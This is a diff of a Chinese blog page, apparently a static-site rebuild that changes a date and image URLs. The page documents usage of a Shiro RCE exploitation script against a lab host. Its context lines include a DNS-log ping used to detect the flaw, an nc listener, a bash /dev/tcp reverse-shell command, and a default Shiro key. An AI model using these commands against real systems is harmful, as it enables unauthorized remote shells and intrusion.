@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-20
+                    2021-08-04
                 </div>
                 
 
@@ -480,12 +480,12 @@ python3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;t
 <pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125;
 
 示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-21-10.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-21-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果你有自己的key，也可以使用 -k 参数进行指定。</p>
 <pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;ping &#123;your.ceye.io&#125;&quot; -t &#123;your_token&#125; -k &#123;key&#125;
 
 示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;ping txxxxd.ceye.io&quot; -t 1xxxxxxxxxxxxx6 -k kPH+bIxk5D2deZiIxcaaaA==</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-27-47.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-06-19_22-27-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、反弹shell"><a href="#2、反弹shell" class="headerlink" title="2、反弹shell"></a>2、反弹shell</h2><p>这里我采用bash命令反弹到本地nc监听端口的方式，因此我这里需要先在本地建立一个 nc 监听端口。</p>
 <pre><code>nc -lvvp 9527</code></pre>
 <p>之后，执行反弹shell命令</p>
@@ -496,12 +496,12 @@ python3 shiro-check-rce.py (-c) &lt;command&gt; [-h] [-k] &lt;key&gt; [-t] &lt;t
 <pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot;
 
 示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot;</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell.gif"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>如果知道key的话，就直接 -k 指定 key 即可</p>
 <pre><code>python3 shiro-check-rce.py -u &#123;target_URL&#125; -c &quot;bash -i &gt;&amp; /dev/tcp/&#123;your_nc_ip&#125;/&#123;your_nc_port&#125; 0&gt;&amp;1&quot; -k &#123;key&#125;
 
 示例：python3 shiro-check-rce.py -u http://192.168.175.146:8080/ -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.175.152/9527 0&gt;&amp;1&quot; -k kPH+bIxk5D2deZiIxcaaaA==</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell_key.gif"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/65_shiro_bash_shell_key.gif?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul>
 <li>本程序需要 python3 环境以及 java环境</li>
 <li>在进行漏洞检测时，-c 指定 ping 的 URL 和 -t 指定的 token 需要是同一 ceye 账户的。</li>
